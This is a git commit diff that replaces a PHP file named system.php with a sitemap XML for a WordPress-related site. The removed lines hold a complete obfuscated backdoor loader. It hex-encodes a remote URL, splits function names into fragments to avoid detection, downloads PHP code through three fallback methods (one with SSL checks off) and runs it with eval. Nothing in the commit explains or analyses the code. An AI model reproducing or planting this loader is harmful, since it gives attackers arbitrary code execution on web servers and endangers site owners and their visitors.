e646a241acaa311cf221b7fae8654836b93443c8
tokekmerah <Okewlatop@gmail.com>
2024-11-26 16:42:58 +0700

    Update system.php

--- system.php
+++ system.php
@@ -1,59 +1,16 @@
-<?php
-$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f73656e746170616269732f54696e792d4b75726c756e672f726566732f68656164732f6d61696e2f636c6173732d77702d626c6f672d666f726d61742e706870';
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset
+      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
+      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
+            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+<!-- created with Free Online Sitemap Generator www.xml-sitemaps.com -->
 
-function hex2str($hex) {
-    $str = '';
-    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
-        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
-    }
-    return $str;
-}
 
-$url = hex2str($hexUrl);
+<url>
+  <loc>https://wptechmaster.com/</loc>
+  <lastmod>2024-11-26T09:42:19+00:00</lastmod>
+</url>
 
-function downloadWithFileGetContents($url) {
-    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
-        return file_get_contents($url);
-    }
-    return false;
-}
 
-function downloadWithCurl($url) {
-    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        return $data;
-    }
-    return false;
-}
-
-function downloadWithFopen($url) {
-    $result = false;
-    if ($fp = fopen($url, 'r')) {
-        $result = '';
-        while ($data = fread($fp, 8192)) {
-            $result .= $data;
-        }
-        fclose($fp);
-    }
-    return $result;
-}
-
-$phpScript = downloadWithFileGetContents($url);
-if ($phpScript === false) {
-    $phpScript = downloadWithCurl($url);
-}
-if ($phpScript === false) {
-    $phpScript = downloadWithFopen($url);
-}
-
-if ($phpScript === false) {
-    die("Gagal mendownload script PHP dari URL dengan semua metode.");
-}
-
-eval('?>' . $phpScript);
-?>
+</urlset>
